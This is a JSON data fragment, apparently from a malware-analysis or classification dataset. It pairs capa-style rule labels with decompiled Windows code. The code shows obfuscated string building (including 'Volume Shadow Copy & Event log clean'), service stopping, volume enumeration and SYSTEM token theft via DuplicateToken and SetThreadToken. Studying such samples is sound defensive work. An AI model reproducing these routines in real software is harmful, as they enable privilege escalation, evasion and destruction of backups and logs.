fcn.00401120(0x6c);\n    fcn.00401120(0x20);\n    fcn.00401120(0x61);\n    fcn.00401120(0x70);\n    fcn.00401120(0x70);\n    fcn.00401120(0x6c);\n    fcn.00401120(0x69);\n    fcn.00401120(99);\n    fcn.00401120(0x61);\n    uVar17 = 0x74;\n    fcn.00401120(0x74);\n    fcn.00401120(0x69);\n    fcn.00401120(0x6f);\n    fcn.00401120(0x6e);\n    uVar12 = 0;\n    do {\n        fcn.00401010(uVar12);\n        puVar7 = fcn.00401010(uVar12);\n        uVar1 = fcn.00401120(uVar17);\n        uVar12 = uVar12 + 1;\n        *puVar7 = uVar1;\n    } while (uVar12 < 0x1a);\n    puVar7 = fcn.00401010(0x1a);\n    *puVar7 = 0;\n    fcn.00401000();\n    iVar3 = 0;\n    iVar8 = 0;\n    do {\n        if (*(&stack0xfffff5bc + iVar3 * 4) == 0) {\n            iVar8 = iVar8 + 1;\n            iVar3 = 0;\n            if (iVar8 == 2) {\n                fcn.00401120(0x56);\n                fcn.00401120(0x6f);\n                fcn.00401120(0x6c);\n                fcn.00401120(0x75);\n                fcn.00401120(0x6d);\n                fcn.00401120(0x65);\n                fcn.00401120(0x20);\n                fcn.00401120(0x53);\n                fcn.00401120(0x68);\n                fcn.00401120(0x61);\n                fcn.00401120(100);\n                fcn.00401120(0x6f);\n                fcn.00401120(0x77);\n                fcn.00401120(0x20);\n                fcn.00401120(0x43);\n                fcn.00401120(0x6f);\n                fcn.00401120(0x70);\n                fcn.00401120(0x79);\n                fcn.00401120(0x20);\n                fcn.00401120(0x26);\n                fcn.00401120(0x20);\n                fcn.00401120(0x45);\n                fcn.00401120(0x76);\n                fcn.00401120(0x65);\n                fcn.00401120(0x6e);\n                fcn.00401120(0x74);\n                fcn.00401120(0x20);\n                fcn.00401120(0x6c);\n                fcn.00401120(0x6f);\n                fcn.00401120(0x67);\n                fcn.00401120(0x20);\n                fcn.00401120(99);\n                uVar17 = 0x6c;\n                fcn.00401120(0x6c);\n                fcn.00401120(0x65);\n                fcn.00401120(0x61);\n                fcn.00401120(0x6e);\n                uVar12 = 0;\n                do {\n                    fcn.00401010(uVar12);\n                    puVar7 = fcn.00401010(uVar12);\n                    uVar1 = fcn.00401120(uVar17);\n                    uVar12 = uVar12 + 1;\n                    *puVar7 = uVar1;\n                } while (uVar12 < 0x24);\n                arglist = 0x24;\n                puVar7 = fcn.00401010(0x24);\n                *puVar7 = 0;\n                uVar17 = fcn.00401000();\n                fcn.0040a0b0(uVar17, arglist);\n                if (CONCAT22(extraout_var_00, in_GS) != 0) {\n                    fcn.00401120(0x57);\n                    fcn.00401120(0x6f);\n                    fcn.00401120(0x77);\n                    fcn.00401120(0x36);\n                    fcn.00401120(0x34);\n                    fcn.00401120(0x52);\n                    fcn.00401120(0x65);\n                    fcn.00401120(0x76);\n                    fcn.00401120(0x65);\n                    fcn.00401120(0x72);\n                    fcn.00401120(0x74);\n                    fcn.00401120(0x57);\n                    fcn.00401120(0x6f);\n                    fcn.00401120(0x77);\n                    fcn.00401120(0x36);\n                    fcn.00401120(0x34);\n                    fcn.00401120(0x46);\n                    fcn.00401120(0x73);\n                    fcn.00401120(0x52);\n                    fcn.00401120(0x65);\n                    fcn.00401120(100);\n                    fcn.00401120(0x69);\n                    fcn.00401120(0x72);\n                    fcn.00401120(0x65);\n                    fcn.00401120(99);\n                    uVar17 = 0x74;\n                    fcn.00401120(0x74);\n                    fcn.00401120(0x69);\n                    fcn.00401120(0x6f);\n                    fcn.00401120(0x6e);\n                    uVar12 = 0;\n                    do {\n                        fcn.00401010(uVar12);\n                        puVar7 = fcn.00401010(uVar12);\n                        uVar1 = fcn.00401120(uVar17);\n                        uVar12 = uVar12 + 1;\n                        *puVar7 = uVar1;\n                    } while (uVar12 < 0x1d);\n                    puVar7 = fcn.00401010(0x1d);\n                    *puVar7 = 0;\n                    fcn.00401000();\n                    fcn.00401120(0x6b);\n                    fcn.00401120(0x65);\n                    fcn.00401120(0x72);\n                    fcn.00401120(0x6e);\n                    uVar17 = 0x65;\n                    fcn.00401120(0x65);\n                    fcn.00401120(0x6c);\n                    fcn.00401120(0x33);\n                    fcn.00401120(0x32);\n                    uVar12 = 0;\n                    do {\n                        fcn.00401010(uVar12);\n                        puVar7 = fcn.00401010(uVar12);\n                        uVar1 = fcn.00401120(uVar17);\n                        uVar12 = uVar12 + 1;\n                        *puVar7 = uVar1;\n                    } while (uVar12 < 8);\n                    puVar7 = fcn.00401010(8);\n                    *puVar7 = 0;\n                    fcn.00401000();\n                    (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n                    pcVar11 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n                    if (pcVar11 != NULL) {\n                        (*pcVar11)();\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_ExitThread)();\n                pcVar11 = swi(3);\n                (*pcVar11)();\n                return;\n            }\n        }\n        fcn.0040cc00(&stack0xfffffc6c, 0, 0x104);\n        iVar4 = *(&stack0xfffff5bc + iVar3 * 4);\n        if (iVar4 == 0) {\n            iVar5 = 0;\n        }\n        else {\n            iVar5 = fcn.0040cd50();\n        }\n        fcn.0040cbe0(&stack0xfffffc6c, iVar4, iVar5 + 1);\n        iVar3 = iVar3 + 1;\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n        pcVar11 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar4 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            (*pcVar11)();\n        }\n        fcn.0040cd60();\n    } while( true );\ncode_r0x004101a6:\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    if (30000 < iVar5 - iVar4) {\ncode_r0x004101b7:\n        iVar3 = iVar3 + 1;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    }\n    goto joined_r0x00410165;\n}\n",
        "token_count": 34072
    },
    "0041a260": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0041a260(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t in_FS_OFFSET;\n    uint lpServiceStatus;\n    int32_t var_60h;\n    uint dwMilliseconds;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint32_t var_20h;\n    uint hSCManager;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    int32_t *ptr;\n    uint32_t var_8h;\n    uint size;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetTickCount;\n    hSCManager = param_2;\n    var_18h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    pcVar2 = _sym.imp.ADVAPI32.dll_EnumDependentServicesA;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_EnumDependentServicesA)(param_1, 1, 0, 0, &size, &var_8h);\n    if (iVar4 != 0) {\n        return 1;\n    }\n    if ((*(in_FS_OFFSET + 0x34) == 0xea) && (ptr = (*_sym.imp.msvcrt.dll_malloc)(size),  ptr != NULL)) {\n        fcn.0040cc00(ptr, 0, size);\n        iVar5 = (*pcVar2)(param_1, 1, ptr, size, &size, &var_8h);\n        iVar4 = var_18h;\n        if (iVar5 != 0) {\n            var_10h = 0;\n            piVar6 = ptr;\n            if (var_8h != 0) {\n                do {\n                    var_18h = *piVar6;\n                    var_30h = piVar6[4];\n                    iStack48 = piVar6[5];\n                    iStack44 = piVar6[6];\n                    iStack40 = piVar6[7];\n                    var_20h = piVar6[8];\n                    var_14h = piVar6;\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, var_18h, 0x24);\n                    if (iVar5 == 0) {\n                        return 0;\n                    }\n                    iVar7 = (*_sym.imp.ADVAPI32.dll_ControlService)(iVar5, 1, &lpServiceStatus);\n                    if (iVar7 == 0) {\n                        return 0;\n                    }\n                    if (var_60h != 1) {\ncode_r0x0041a350:\n                        (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n                        iVar7 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)(iVar5, 0, &lpServiceStatus, 0x24, &size);\n                        if (iVar7 == 0) {\n                            return 0;\n                        }\n                        if (var_60h != 1) goto code_r0x0041a37a;\n                        uVar8 = 0;\n                        var_30h = str.i:_fe._0_4_;\n                        iStack48 = *0x424614;\n                        iStack44 = *0x424618;\n                        iStack40 = *0x42461c;\n                        var_20h = 0xd0c19;\n                        do {\n                            var_30h._0_1_ = str.i:_fe._0_4_;\n                            puVar1 = &var_30h + uVar8 + 1;\n                            *puVar1 = *puVar1 ^ var_30h;\n                            uVar8 = uVar8 + 1;\n                        } while (uVar8 < 0x12);\n                        var_20h = var_20h & 0xffffff;\n                        fcn.0040a0b0(&var_30h + 1, var_18h);\n                    }\ncode_r0x0041a3c1:\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar5);\n                    var_10h = var_10h + 1;\n                    var_14h = var_14h + 9;\n                    piVar6 = var_14h;\n                } while (var_10h < var_8h);\n            }\n            (*_sym.imp.msvcrt.dll_free)(ptr);\n            return 1;\n        }\n    }\n    return 0;\ncode_r0x0041a37a:\n    iVar7 = (*pcVar3)();\n    if (30000 < iVar7 - iVar4) {\n        return 0;\n    }\n    if (var_60h == 1) goto code_r0x0041a3c1;\n    goto code_r0x0041a350;\n}\n",
        "token_count": 1130
    },
    "0041b8b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041b8b0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_FS_OFFSET;\n    uint ARG_0;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint16_t var_16h;\n    uint16_t var_14h;\n    uint16_t var_12h;\n    uint16_t var_10h;\n    uint16_t var_eh;\n    uint16_t var_ch;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    ushort var_6h;\n    uint32_t lpcchReturnLength;\n    \n    pcVar1 = _sym.imp.msvcrt.dll_malloc;\n    lpcchReturnLength = 0x209;\n    iVar2 = (*_sym.imp.msvcrt.dll_malloc)(0x412);\n    if (iVar2 != 0) {\n        while( true ) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetVolumePathNamesForVolumeNameW)\n                              (param_1, iVar2, lpcchReturnLength, &lpcchReturnLength);\n            if ((iVar3 != 0) || (*(in_FS_OFFSET + 0x34) != 0xea)) break;\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n            iVar2 = (*pcVar1)(lpcchReturnLength * 2);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(param_1);\n        if (((iVar3 == 2) || (iVar3 == 3)) && (lpcchReturnLength < 3)) {\n            var_32h = 0x1e003b;\n            var_1ah._0_2_ = *0x423fda ^ 0x3b;\n            var_2eh = 0x670048;\n            var_1ah._2_2_ = str.14:07:49._0_2_ ^ 0x3b;\n            var_2ah = 0x540059;\n            var_16h = str.14:07:49._2_2_ ^ 0x3b;\n            var_26h = 0x4f0054;\n            var_14h = str.14:07:49._4_2_ ^ 0x3b;\n            var_22h = 0x5c0056;\n            var_12h = str.14:07:49._6_2_ ^ 0x3b;\n            var_1eh = 0x3b0049;\n            var_10h = *0x423fe4 ^ 0x3b;\n            var_eh = *0x423fe6 ^ 0x3b;\n            var_ch = str.WTSQueryUserToken._0_2_ ^ 0x3b;\n            var_ah = str.WTSQueryUserToken._2_2_ ^ 0x3b;\n            var_8h = str.WTSQueryUserToken._4_2_ ^ 0x3b;\n            uVar4 = 0;\n            do {\n                *(&var_32h + uVar4 * 2 + 2) = *(&var_32h + uVar4 * 2 + 2) ^ 0x3b;\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < 0x15);\n            var_6h = 0;\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &var_32h + 2, param_1);\n            iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&ARG_0, 0x80000000, 3, 0, 3, 0x80, 0);\n            if (iVar3 == -1) {\n                fcn.0041ba80();\n            }\n            else {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            }\n        }\n        if (iVar2 != 0) {\n            (*_sym.imp.msvcrt.dll_free)(iVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 989
    },
    "0041bbe0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041bbe0(void)\n\n{\n    uint *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_410h;\n    uint var_208h;\n    int16_t var_204h;\n    int16_t var_202h;\n    uchar var_200h [512];\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)(&var_208h, 0x104);\n    pcVar3 = _sym.imp.KERNEL32.dll_FindNextVolumeW;\n    if (iVar4 == -1) {\n        return 0;\n    }\n    do {\n        puVar1 = &var_208h;\n        iVar7 = 0;\n        iVar2 = var_208h;\n        while (iVar2 != 0) {\n            puVar1 = puVar1 + 2;\n            iVar7 = iVar7 + 1;\n            iVar2 = *puVar1;\n        }\n        iVar7 = iVar7 + -1;\n        if ((((var_208h != 0x5c) || (var_208h._2_2_ != 0x5c)) || (var_204h != 0x3f)) ||\n           ((var_202h != 0x5c || (*(&var_208h + iVar7 * 2) != 0x5c)))) break;\n        *(&var_208h + iVar7 * 2) = 0;\n        iVar5 = (*_sym.imp.KERNEL32.dll_QueryDosDeviceW)(var_200h, &var_410h, 0x104);\n        *(&var_208h + iVar7 * 2) = 0x5c;\n        if (iVar5 == 0) break;\n        fcn.0041b8b0();\n        iVar7 = (*pcVar3)(iVar4, &var_208h, 0x104);\n    } while (iVar7 != 0);\n    (*_sym.imp.KERNEL32.dll_FindVolumeClose)(iVar4);\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar3 = swi(3);\n    uVar6 = (*pcVar3)();\n    return uVar6;\n}\n",
        "token_count": 513
    },
    "0041bce0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bce0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_50h;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = 0;\n    var_10h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar2 != -1) {\n        var_178h = 0x128;\n        fcn.0040cc00(&var_174h, 0, 0x124);\n        var_ch = 0;\n        iVar3 = (*_sym.imp.KERNEL32.dll_Process32First)(iVar2, &var_178h);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        while (iVar3 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1000, 0, var_170h);\n            if (iVar3 != 0) {\n                iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar3, 10, &var_4h);\n                if (iVar4 != 0) {\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(var_4h, 10, &var_50h, 0x38, &var_14h);\n                    if (((iVar4 != 0) && (var_48h == arg_8h)) && (var_44h == arg_ch)) {\n                        var_ch = 1;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateToken)(var_4h, 2, &var_8h);\n                        if (iVar4 != 0) {\n                            var_10h = (*_sym.imp.ADVAPI32.dll_SetThreadToken)(0, var_8h);\n                            (*pcVar1)(var_8h);\n                        }\n                    }\n                    (*pcVar1)(var_4h);\n                }\n                (*pcVar1)(iVar3);\n                uVar5 = var_10h;\n                if (var_ch != 0) break;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_Process32Next)(iVar2, &var_178h);\n            uVar5 = var_10h;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return uVar5;\n}\n",
        "token_count": 623
    },
    "0041c260": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0041c260(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EDI;\n    int32_t iVar8;\n    uint uVar9;\n    uchar *puVar10;\n    uint uStack492;\n    uchar *puStack488;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint uStack460;\n    uint uStack456;\n    uchar auStack448 [12];\n    uint uStack436;\n    int32_t iStack424;\n    uchar *puStack420;\n    uchar auStack412 [68];\n    uchar auStack344 [8];\n    uint uStack336;\n    uchar auStack332 [328];\n    \n    puStack476 = &stack0xfffffe40;\n    uStack480 = 8;\n    uStack484 = 0xffffffff;\n    puStack488 = 0x41c27e;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)();\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        puStack488 = &stack0xfffffe38;\n        uStack492 = 4;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)();\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (((iVar3 != 0) && (puStack488 == 0x2)) && (iVar3 = (*pcVar1)(uStack480, 0x13, &stack0xfffffe18),  iVar3 != 0)\n           ) {\n            puVar10 = &stack0xfffffe24;\n            iVar3 = (*pcVar1)(puStack488, 10, &stack0xfffffe40);\n            (*pcVar2)(puVar10);\n            if (iVar3 != 0) {\n                iVar3 = 0;\n                uStack456 = uStack436;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)();\n                if (iVar4 != -1) {\n                    uStack336 = 0x128;\n                    fcn.0040cc00(&stack0xfffffeb4, 0, 0x124);\n                    iVar7 = iVar4;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_Process32First)();\n                    while (iVar5 != 0) {\n                        iVar5 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1000, 0, uStack336);\n                        iVar3 = unaff_EDI;\n                        if (iVar5 != 0) {\n                            uVar9 = 10;\n                            iVar8 = iVar5;\n                            iVar6 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar5, 10, &stack0xfffffe14);\n                            iVar3 = unaff_EDI;\n                            if (iVar6 != 0) {\n                                iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                                  (uStack460, 10, &stack0xfffffe64, 0x38, &stack0xfffffe28);\n                                if (((iVar3 != 0) && (iStack424 == 0x12)) &&\n                                   ((puStack420 == &stack0xfffffe2c &&\n                                    (iVar3 = (*_sym.imp.ADVAPI32.dll_DuplicateToken)(iVar8, 2, &stack0xfffffe00), \n                                    iVar3 != 0)))) {\n                                    iVar7 = (*_sym.imp.ADVAPI32.dll_SetThreadToken)(0, iVar7);\n                                    (*pcVar2)(uVar9);\n                                }\n                                (*pcVar2)(iVar8);\n                                iVar3 = unaff_EDI;\n                            }\n                            (*pcVar2)(iVar5);\n                            if (puStack476 != NULL) break;\n                        }\n                        iVar5 = (*_sym.imp.KERNEL32.dll_Process32Next)(iVar4, &stack0xfffffea8);\n                        unaff_EDI = iVar3;\n                    }\n                    (*pcVar2)(iVar4);\n                    if (iVar3 != 0) {\n                        return 1;\n                    }\n                }\n            }\n        }\n        (*pcVar2)();\n    }\n    return 0;\n}\n",
        "token_count": 942
    },
    "0041c440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1a8h_2\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0041c440(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    int32_t *piVar12;\n    uint32_t uVar13;\n    int32_t *piVar14;\n    uint var_1a8h;\n    uint var_198h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_17ch;\n    uint var_100h;\n    uint var_f5h;\n    uint var_e5h;\n    uint var_d5h;\n    uint var_d1h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_aah;\n    uint var_9ah;\n    uint var_96h;\n    uint var_84h;\n    uint var_80h;\n    uint var_44h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1ch;\n    uint var_13h;\n    uint var_1h;\n    int32_t iStack484;\n    uint *puStack480;\n    int32_t iStack476;\n    int32_t iStack472;\n    int32_t iStack468;\n    uchar *puStack464;\n    uint *puStack456;\n    uint uStack452;\n    uint uStack448;\n    int32_t iStack444;\n    uchar *puStack440;\n    int32_t iStack436;\n    int32_t iStack432;\n    uint var_1a8h_2;\n    uchar auStack412 [8];\n    uint uStack404;\n    uint uStack400;\n    uint *puStack396;\n    ulong uStack392;\n    uint uStack384;\n    uint var_178h;\n    uint32_t var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_100h_2;\n    uint uStack249;\n    uint uStack245;\n    uint uStack241;\n    uint uStack237;\n    uint uStack233;\n    uint uStack229;\n    uint uStack225;\n    uint uStack221;\n    uint uStack217;\n    uint uStack213;\n    uchar uStack209;\n    code *var_cch_2;\n    code *var_c8h_2;\n    int32_t var_c4h;\n    int32_t *var_c0h;\n    int32_t *var_bch;\n    code *var_b8h_2;\n    uint var_b4h_2;\n    uchar *var_b0h_2;\n    uint var_aah_2;\n    uint uStack170;\n    uint uStack166;\n    uint uStack162;\n    uint var_9ah_2;\n    uint var_96h_2;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint32_t uStack132;\n    uint var_7ch;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint uStack98;\n    uint uStack94;\n    uint uStack90;\n    uint var_52h;\n    uint var_4eh;\n    uint var_4ah;\n    uint16_t var_46h;\n    uint var_44h_2;\n    int32_t var_40h;\n    int32_t *var_3ch_2;\n    uint32_t var_38h_2;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_29h_2;\n    uint uStack41;\n    uint uStack37;\n    uchar uStack33;\n    uchar uStack32;\n    uchar uStack31;\n    uchar uStack30;\n    uchar uStack29;\n    uchar uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uchar uStack24;\n    uchar uStack23;\n    uchar uStack22;\n    uchar uStack21;\n    code *var_10h;\n    uchar var_ch;\n    uchar var_bh;\n    uchar var_ah;\n    int32_t var_8h;\n    uchar uStack6;\n    uchar uStack5;\n    \n    if (*0x429324 == 0) {\n        var_ah = 0;\n        var_bh = 0x6c;\n        iStack432 = &fcn.0041c440::var_10h + 1;\n        var_10h = 0x64746e29;\n        var_ch = 0x6c;\n        iStack436 = 0x41c492;\n        *0x429324 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    }\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    uVar11 = 0;\n    var_aah_2 = *0x424770;\n    uStack170 = *0x424774;\n    uStack166 = *0x424778;\n    uStack162 = *0x42477c;\n    var_9ah_2 = 0xe091214;\n    var_96h_2._0_2_ = 7;\n    do {\n        var_aah_2._0_1_ = *0x424770;\n        puVar1 = &fcn.0041c440::var_aah_2 + uVar11 + 1;\n        *puVar1 = *puVar1 ^ var_aah_2;\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 0x14);\n    iStack432 = &fcn.0041c440::var_aah_2 + 1;\n    var_96h_2._0_2_ = var_96h_2 & 0xff;\n    puStack440 = 0x41c4ea;\n    iStack436 = *0x429324;\n    pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack249 = *0x4247a0;\n    uStack245 = *0x4247a4;\n    uStack241 = *0x4247a8;\n    uStack237 = *0x4247ac;\n    uVar11 = 0;\n    var_cch_2 = pcVar7;\n    uStack233 = *0x424e70;\n    uStack229 = *0x424e74;\n    uStack225 = *0x424e78;\n    uStack221 = *0x424e7c;\n    uStack217 = 0x60477c60;\n    uStack213 = 0x67616075;\n    uStack209 = 0;\n    do {\n        uStack249._0_1_ = *0x4247a0;\n        (&stack0xffffff08)[uVar11] = (&stack0xffffff08)[uVar11] ^ uStack249;\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 0x27);\n    puStack440 = &stack0xffffff08;\n    uStack209 = 0;\n    iStack444 = *0x429324;\n    uStack448 = 0x41c559;\n    pcVar8 = (*pcVar5)();\n    if ((pcVar7 == NULL) || (pcVar8 == NULL)) {\n        return 0x65a;\n    }\n    uStack448 = 0;\n    uStack452 = 0;\n    puStack456 = &fcn.0041c440::var_100h_2;\n    puStack464 = 0x41c577;\n    iVar9 = (*pcVar8)();\n    if (-1 < iVar9) {\n        puStack396 = &fcn.0041c440::var_100h_2;\n        uStack32 = 0x76;\n        uStack30 = 0x74;\n        uStack31 = 0x4e;\n        uStack5 = 0x1a;\n        uStack23 = 0x6c;\n        uStack6 = 0x13;\n        uStack27 = 0x65;\n        uStack22 = 0x65;\n        uStack29 = 0x4f;\n        puStack464 = &stack0xffffffe1;\n        iStack468 = *0x429324;\n        uStack28 = 0x70;\n        uStack404 = 0x18;\n        uStack26 = 0x6e;\n        uStack400 = 0;\n        uStack25 = 0x46;\n        uStack392 = 0;\n        uStack24 = 0x69;\n        uStack384 = 0;\n        uStack21 = 0;\n        iStack472 = 0x41c622;\n        pcVar7 = (*pcVar5)();\n        var_29h_2 = 0x5b587734;\n        uStack41 = 0x557c5147;\n        uStack37 = 0x5158505a;\n        uVar11 = 0;\n        uStack33 = 0;\n        do {\n            puVar1 = &fcn.0041c440::var_29h_2 + uVar11 + 1;\n            *puVar1 = *puVar1 ^ 0x34;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < 0xb);\n        iStack472 = &fcn.0041c440::var_29h_2 + 1;\n        uStack33 = 0;\n        iStack476 = *0x429324;\n        puStack480 = 0x41c660;\n        var_c8h_2 = (*pcVar5)();\n        if ((pcVar7 == NULL) || (var_c8h_2 == NULL)) {\n            iVar9 = 0x65a;\n        }\n        else {\n            puStack480 = NULL;\n            iStack484 = 7;\n            iVar9 = (*pcVar7)(&fcn.0041c440::var_44h_2, 0x80, &stack0xfffffe6c, &stack0xfffffe64);\n            if (-1 < iVar9) {\n                uVar11 = 0;\n                var_b4h_2 = var_44h_2;\n                stack0xffffff68 = *0x424790;\n                uStack148 = *0x424794;\n                uStack144 = *0x424798;\n                uStack140 = *0x42479c;\n                uStack136 = 0xc242523;\n                uStack132 = 0x2f2623;\n                do {\n                    var_96h_2._2_1_ = *0x424790;\n                    puVar1 = &fcn.0041c440::var_96h_2 + uVar11 + 3;\n                    *puVar1 = *puVar1 ^ var_96h_2._2_1_;\n                    uVar11 = uVar11 + 1;\n                } while (uVar11 < 0x16);\n                puStack480 = &fcn.0041c440::var_96h_2 + 3;\n                uStack132 = uStack132 & 0xffffff;\n                iStack484 = *0x429324;\n                var_b0h_2 = &stack0xfffffe1c;\n                var_b8h_2 = 